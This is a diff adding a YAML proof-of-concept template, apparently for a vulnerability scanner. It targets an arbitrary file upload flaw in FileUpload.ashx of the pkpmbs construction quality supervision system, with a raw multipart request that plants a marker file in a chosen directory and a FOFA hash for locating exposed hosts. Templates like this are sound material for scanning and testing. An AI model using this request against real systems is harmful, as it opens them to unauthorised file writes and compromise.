@@ -1,0 +1,73 @@
+id: poc-zee37wzmqtae38oq
+info:
+  name: pkpmbs 建设工程质量监督系统 FileUpload.ashx 文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zee37wzmqtae38oq'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zee37wzmqtae38oq
+    fofa: icon_hash="2001627082"
+http:
+- raw:
+  - 'POST /Platform/System/FileUpload.ashx HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept-Encoding: gzip
+
+
+    Content-Type: multipart/form-data; boundary=----YsOxWxSvj1KyZow1PTsh98fdu6l
+
+
+
+
+    ------YsOxWxSvj1KyZow1PTsh98fdu6l
+
+
+    Content-Disposition: form-data; name="file"; filename="dudesuite.txt"
+
+
+    Content-Type: image/png
+
+
+
+
+    dudesuite
+
+
+    ------YsOxWxSvj1KyZow1PTsh98fdu6l
+
+
+    Content-Disposition: form-data; name="target"
+
+
+
+
+    /Applications/SkillDevelopAndEHS/
+
+
+    ------YsOxWxSvj1KyZow1PTsh98fdu6l--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    dudesuite.txt
+
+
+    # 上传文件定位
+
+    /Applications/SkillDevelopAndEHS/dudesuite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
